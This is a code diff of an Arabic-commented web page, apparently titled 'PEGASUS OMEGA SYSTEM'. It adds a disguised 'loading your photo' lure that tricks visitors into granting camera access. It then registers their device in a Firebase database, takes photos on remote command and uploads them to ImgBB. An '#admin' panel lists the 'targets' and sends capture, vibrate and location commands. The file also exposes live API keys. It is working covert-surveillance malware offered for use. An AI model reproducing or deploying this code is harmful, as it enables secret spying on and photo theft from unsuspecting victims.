@@ -2,96 +2,173 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>THE DOCTOR | COMMAND & CONTROL</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>THE DOCTOR | PEGASUS OMEGA SYSTEM</title>
     <style>
         :root { --gold: #d4af37; --glow: #00ff41; --bg: #050505; }
-        body { background: var(--bg); color: var(--glow); font-family: 'Courier New', monospace; }
-        .grid { display: grid; grid-template-columns: 300px 1fr; height: 100vh; }
-        .sidebar { border-left: 2px solid var(--gold); padding: 15px; background: #0a0a0a; }
-        .main { padding: 20px; overflow-y: auto; }
-        .target-card { border: 1px solid #333; padding: 10px; margin-bottom: 10px; cursor: pointer; transition: 0.3s; }
+        body { background: var(--bg); color: var(--glow); font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
+        
+        /* واجهة التحكم - تظهر لك فقط */
+        #admin-panel { display: none; height: 100vh; grid-template-columns: 300px 1fr; }
+        .sidebar { border-left: 2px solid var(--gold); background: #0a0a0a; padding: 15px; overflow-y: auto; }
+        .main-view { padding: 20px; display: flex; flex-direction: column; gap: 20px; }
+        .target-card { border: 1px solid #333; padding: 10px; margin-bottom: 10px; cursor: pointer; transition: 0.3s; border-radius: 4px; }
         .target-card:hover { border-color: var(--gold); box-shadow: 0 0 10px var(--gold); }
-        .active { color: var(--gold); font-weight: bold; }
-        .image-gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 10px; }
-        img { width: 100%; border: 1px solid #444; }
-        .cmd-btn { background: transparent; border: 1px solid var(--glow); color: var(--glow); padding: 5px; width: 100%; margin-top: 5px; cursor: pointer; }
+        .btn { background: transparent; border: 1px solid var(--glow); color: var(--glow); padding: 10px; cursor: pointer; width: 100%; margin-top: 5px; }
+        .btn:hover { background: var(--glow); color: #000; }
+        
+        /* واجهة الضحية - التمويه */
+        #victim-ui { display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; }
+        .loader { border: 4px solid #111; border-top: 4px solid var(--gold); border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <div class="grid">
-        <div class="sidebar">
-            <h3>الأجهزة النشطة</h3>
-            <div id="target-list">جاري المزامنة...</div>
-        </div>
-        <div class="main">
-            <h2 id="current-target">اختر وحدة تنفيذية للبدء</h2>
-            <div id="controls" style="display:none;">
-                <button class="cmd-btn" onclick="sendCommand('capture_photo')">التقاط صورة</button>
-                <button class="cmd-btn" onclick="sendCommand('get_files')">سحب الملفات</button>
-                <button class="cmd-btn" onclick="sendCommand('vibrate')">تفعيل الهز (Vibration)</button>
-                <hr>
-                <h4>الصور المستلمة:</h4>
-                <div id="gallery" class="image-gallery"></div>
+
+<div id="victim-ui">
+    <div class="loader"></div>
+    <h2 style="color: #eee;">جاري تحميل الصورة الخاصة بك...</h2>
+    <p style="color: #666;">يرجى منح صلاحية الوصول للمتابعة</p>
+</div>
+
+<div id="admin-panel">
+    <div class="sidebar">
+        <h3 style="color: var(--gold);">الأهداف النشطة 🛰️</h3>
+        <div id="target-list">جاري البحث عن جلسات...</div>
+    </div>
+    <div class="main-view">
+        <h2 id="active-target-id" style="color: var(--gold);">اختر هدفاً للسيطرة</h2>
+        <div id="controls" style="display:none;">
+            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
+                <button class="btn" onclick="sendCommand('capture')">📸 التقاط صورة</button>
+                <button class="btn" onclick="sendCommand('vibrate')">📳 تفعيل الهز</button>
+                <button class="btn" onclick="sendCommand('location')">📍 تحديد الموقع</button>
+                <button class="btn" onclick="sendCommand('alert')">⚠️ إرسال تنبيه</button>
             </div>
+            <hr style="border: 0.5px solid #222; margin: 20px 0;">
+            <h4>البيانات المستلمة (ImgBB):</h4>
+            <div id="gallery" style="display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 10px;"></div>
         </div>
     </div>
+</div>
 
-    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
 
-    <script>
-        const firebaseConfig = {
-            apiKey: "AIzaSyDqZlMnIIXpos70i0vx2jwL_SVG68tcr04",
-            authDomain: "hkrs5000.firebaseapp.com",
-            databaseURL: "https://hkrs5000-default-rtdb.firebaseio.com",
-            projectId: "hkrs5000",
-            storageBucket: "hkrs5000.firebasestorage.app",
-            messagingSenderId: "273977078526",
-            appId: "1:273977078526:web:da9e512c2421c300352baf"
-        };
+<script>
+    // تهيئة Firebase بالبيانات الخاصة بك
+    const firebaseConfig = {
+        apiKey: "AIzaSyDqZlMnIIXpos70i0vx2jwL_SVG68tcr04",
+        authDomain: "hkrs5000.firebaseapp.com",
+        databaseURL: "https://hkrs5000-default-rtdb.firebaseio.com",
+        projectId: "hkrs5000",
+        storageBucket: "hkrs5000.firebasestorage.app",
+        messagingSenderId: "273977078526",
+        appId: "1:273977078526:web:da9e512c2421c300352baf"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    const IMGBB_KEY = "a76371f79ef3069a4103d3493271efb5";
+    const isAdmin = window.location.hash === "#admin"; // أضف #admin للرابط للدخول كمدير
+
+    if (isAdmin) {
+        // --- منطق المدير (Admin Mode) ---
+        document.getElementById('victim-ui').style.display = 'none';
+        document.getElementById('admin-panel').style.display = 'grid';
+        loadTargets();
+    } else {
+        // --- منطق الضحية (Payload Mode) ---
+        executePayload();
+    }
+
+    // [وحدة التلغيم]
+    async function executePayload() {
+        const victimID = "V_" + Math.random().toString(36).substr(2, 5);
+        try {
+            // محاولة فتح الكاميرا فوراً
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            // تسجيل الدخول في Firebase
+            await db.ref('devices/' + victimID).set({
+                ua: navigator.userAgent,
+                platform: navigator.platform,
+                lastSeen: Date.now(),
+                status: "Online"
+            });
+
+            // الاستماع للأوامر العكسية
+            db.ref('commands/' + victimID).on('value', async (snapshot) => {
+                const cmd = snapshot.val();
+                if (cmd) {
+                    if (cmd.action === 'capture') {
+                        // كود التقاط الصورة ورفعها لـ ImgBB
+                        takePhotoAndUpload(stream, victimID);
+                    } else if (cmd.action === 'vibrate') {
+                        if (navigator.vibrate) navigator.vibrate(2000);
+                    }
+                    db.ref('commands/' + victimID).remove(); // مسح الأمر بعد التنفيذ
+                }
+            });
+        } catch (e) {
+            console.log("Waiting for permissions...");
+        }
+    }
+
+    async function takePhotoAndUpload(stream, id) {
+        const track = stream.getVideoTracks()[0];
+        const capture = new ImageCapture(track);
+        const blob = await capture.takePhoto();
         
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.database();
-        let selectedId = null;
+        let formData = new FormData();
+        formData.append('image', blob);
 
-        // مزامنة قائمة الأهداف
-        db.ref('devices').on('value', snapshot => {
+        fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_KEY}`, {
+            method: 'POST',
+            body: formData
+        }).then(res => res.json()).then(data => {
+            db.ref(`data/${id}/images`).push({ url: data.data.url, time: Date.now() });
+        });
+    }
+
+    // [وحدة التحكم]
+    let currentSelectedTarget = null;
+    function loadTargets() {
+        db.ref('devices').on('value', snap => {
             const list = document.getElementById('target-list');
             list.innerHTML = "";
-            snapshot.forEach(child => {
-                const device = child.val();
+            snap.forEach(child => {
                 const div = document.createElement('div');
                 div.className = "target-card";
-                div.innerHTML = `ID: ${child.key} <br> <span class="active">نشط</span>`;
-                div.onclick = () => selectDevice(child.key);
+                div.innerHTML = `Target: ${child.key}<br><small>${child.val().platform}</small>`;
+                div.onclick = () => {
+                    currentSelectedTarget = child.key;
+                    document.getElementById('active-target-id').innerText = "التحكم في: " + child.key;
+                    document.getElementById('controls').style.display = "block";
+                    loadGallery(child.key);
+                };
                 list.appendChild(div);
             });
         });
+    }
 
-        function selectDevice(id) {
-            selectedId = id;
-            document.getElementById('current-target').innerText = "التحكم في: " + id;
-            document.getElementById('controls').style.display = "block";
-            loadImages(id);
-        }
+    function sendCommand(action) {
+        if (!currentSelectedTarget) return;
+        db.ref('commands/' + currentSelectedTarget).set({ action: action, ts: Date.now() });
+        alert("تم إرسال " + action);
+    }
 
-        function sendCommand(cmd) {
-            if(!selectedId) return;
-            db.ref(`commands/${selectedId}`).set({ action: cmd, timestamp: Date.now() });
-            alert("تم إرسال الأمر: " + cmd);
-        }
-
-        function loadImages(id) {
-            db.ref(`data/${id}/images`).on('value', snapshot => {
-                const gallery = document.getElementById('gallery');
-                gallery.innerHTML = "";
-                snapshot.forEach(child => {
-                    const img = document.createElement('img');
-                    img.src = child.val().url;
-                    gallery.appendChild(img);
-                });
+    function loadGallery(id) {
+        db.ref(`data/${id}/images`).on('value', snap => {
+            const gallery = document.getElementById('gallery');
+            gallery.innerHTML = "";
+            snap.forEach(img => {
+                const el = document.createElement('img');
+                el.src = img.val().url;
+                el.style.width = "100%";
+                gallery.appendChild(el);
             });
-        }
-    </script>
+        });
+    }
+</script>
 </body>
 </html>
